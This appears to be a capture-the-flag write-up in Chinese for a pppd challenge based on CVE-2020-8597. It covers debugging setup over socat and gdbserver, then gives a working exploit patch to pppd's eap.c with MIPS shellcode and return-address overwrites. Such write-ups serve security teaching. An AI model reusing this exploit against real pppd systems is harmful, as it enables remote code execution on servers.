## pppd
[中文](./README_zh.md) [English](./README.md)

[attachment](./attachment.zip)

[docker](./docker.zip)

这道题是要求写CVE-2020-8597的1 day exp
这个cve本身其实是非常简单的，就单纯一个栈溢出
但是难的是与pppd进行通信和在mips环境下面进行调试

在比赛的时候大部分队伍都没有找到与pppd通信的办法，因此我就直接放出提示，使用socat与pppd进行通信

接下来介绍的是如何调试的方法

首先题目默认关闭了network

在/etc/init.d/S40network, 将注释全部删掉，然后修改start.sh脚本，将-net none删除，加上-redir tcp:9999::9999 -redir tcp:4242::4242，这样就配置好network了

然后修改/etc/inittab
将
```
ttyS0::sysinit:/pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100
```
修改为
```
ttyS0::sysinit:/bin/sh
```

然后到github下载一个[gdbserver](https://github.com/hugsy/gdb-static/blob/master/gdbserver-7.12-mips-be), 重新打包一个cpio，启动

进入系统后默认得到一个shell，系统里面自带一个socat

执行
```
socat pty,link=/dev/serial,raw tcp-listen:9999 &
/pppd /dev/serial 9600 local lock defaultroute 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100
```
之后执行下面的命令获取pppd的pid
```
ps |grep pppd
```
使用gdbserver attach上pppd
```
./gdbserver --attach 0.0.0.0:4242 pid
```
然后在外面使用gdb-multiarch去连接gdbserver

之后下载一个pppd的源码，编译
执行
```
socat pty,link=/tmp/serial,rawer tcp:127.0.0.1:9999 &
pppd noauth local lock defaultroute debug nodetach /tmp/serial 9600 user notadmin password notpassword
```
这样就成功进行调试了

之后根据https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb666124的操作patch源码，写exp即可

exp patch如下
```
--- ppp-ppp-2.4.7/pppd/eap.c	2014-08-09 12:31:39.000000000 +0000
+++ ppp-poc/ppp-ppp-2.4.7/pppd/eap.c	2020-04-12 03:23:54.321773453 +0000
@@ -1385,8 +1385,46 @@
 			esp->es_usedpseudo = 2;
 		}
 #endif /* USE_SRP */
-		eap_send_response(esp, id, typenum, esp->es_client.ea_name,
-		    esp->es_client.ea_namelen);
+		//eap_send_response(esp, id, typenum, esp->es_client.ea_name,
+		//    esp->es_client.ea_namelen);
+#define PAY_LEN 256
+		char sc[PAY_LEN];
+		memset(sc, 'C', PAY_LEN);
+		int* shellcode = (int*)sc;
+		shellcode[0]=0x3c09616c;
+		shellcode[1]=0x3529662f;
+		shellcode[2]=0xafa9fff8;
+		shellcode[3]=0x2419ff98;
+		shellcode[4]=0x3204827;
+		shellcode[5]=0xafa9fffc;
+		shellcode[6]=0x27bdfff8;
+		shellcode[7]=0x3a02020;
+		shellcode[8]=0x2805ffff;
+		shellcode[9]=0x2806ffff;
+		shellcode[10]=0x34020fa5;
+		shellcode[11]=0x101010c;
+		shellcode[12]=0xafa2fffc;
+		shellcode[13]=0x8fa4fffc;
+		shellcode[14]=0x3c19ffb5;
+		shellcode[15]=0x3739c7fd;
+		shellcode[16]=0x3202827;
+		shellcode[17]=0x3c190101;
+		shellcode[18]=0x373901fe;
+		shellcode[19]=0x3c060101;
+		shellcode[20]=0x34c60101;
+		shellcode[21]=0x3263026;
+		shellcode[22]=0x34020fa3;
+		shellcode[23]=0x101010c;
+		shellcode[24]=0x3c05004a;
+		shellcode[25]=0x34a53800;
+		shellcode[26]=0x20460002;
+		shellcode[27]=0x3c190042;
+		shellcode[28]=0x37396698;
+		shellcode[29]=0x320f809;
+		shellcode[30]=0x0;
+		sc[PAY_LEN-1] = '\0';
+
+		eap_send_response(esp, id, typenum, shellcode, PAY_LEN);
 		break;

 	case EAPT_NOTIFICATION:
@@ -1452,8 +1490,21 @@
 		BZERO(secret, sizeof (secret));
 		MD5_Update(&mdContext, inp, vallen);
 		MD5_Final(hash, &mdContext);
-		eap_chap_response(esp, id, hash, esp->es_client.ea_name,
-		    esp->es_client.ea_namelen);
+		//eap_chap_response(esp, id, hash, esp->es_client.ea_name,
+		//    esp->es_client.ea_namelen);
+		char payload[1024];
+                memset(payload, 'A', 1023);
+                memset(payload, 'B', 0x2a0);
+		int *tpayload = (int*)(payload + 0x2a0 - 4);
+		//*tpayload = 0x040A0BC;
+		*tpayload = 0x4083FC;
+		//*(tpayload-1) = 0x043EF9C;
+		*(tpayload-1) = 0x43EF9C;
+		*(tpayload-5) = 0x4a7a0c-8;
+
+                payload [1023] = '\0';
+                eap_chap_response(esp, id, hash, payload, 1024);
+		exit(0);
 		break;

 #ifdef USE_SRP
```
